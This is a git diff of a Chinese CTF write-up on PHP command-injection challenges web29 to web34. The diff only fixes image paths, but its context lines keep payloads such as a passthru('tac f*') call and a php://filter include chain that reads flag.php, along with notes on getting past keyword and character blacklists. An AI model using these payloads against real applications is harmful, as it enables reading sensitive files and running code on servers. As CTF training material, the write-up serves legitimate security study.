@@ -14,7 +14,7 @@ cover: /images/4.jpg
 
 ## web29
 
-![web29](/images/web29.png)
+![web29](images/web29.png)
 
 检查GET请求中是否存在名为'c'的参数，并将值赋给$c，正则匹配检查$c是否包含‘flag’，其中/i表示不区分大小写
 
@@ -32,7 +32,7 @@ cover: /images/4.jpg
 
 ## web30
 
-![web30](/images/web30.png)
+![web30](images/web30.png)
 
 这次多禁用了system和php
 
@@ -40,7 +40,7 @@ system还可以用exec和passthru代替
 
 关于这两个函数的区别
 
-![web30a](/images/web30a.png)
+![web30a](images/web30a.png)
 
 **?c=passthru('tac f*');**
 
@@ -50,7 +50,7 @@ system还可以用exec和passthru代替
 
 ## web31
 
-![web31](/images/web31.png)
+![web31](images/web31.png)
 
 限制了flag,system,php,cat,sort,shell,点号,空格,单引号
 
@@ -86,7 +86,7 @@ system还可以用exec和passthru代替
 
 ## web32
 
-![web32](/images/web32.png)
+![web32](images/web32.png)
 
 限制了flag,system,php,cat,sort,shell,echo,点号,空格,单引号,分号,左括号
 
@@ -104,13 +104,13 @@ system还可以用exec和passthru代替
 
 ## web33
 
-![web33](/images/web33.png)
+![web33](images/web33.png)
 
 ?c=include$_GET[1]?>&1=php://filter/convert.base64-encode/resource=flag.php
 
 ## web34
 
-![web34](/images/web34.png)
+![web34](images/web34.png)
 
 ?c=include$_GET[1]?>&1=php://filter/convert.base64-encode/resource=flag.php
 
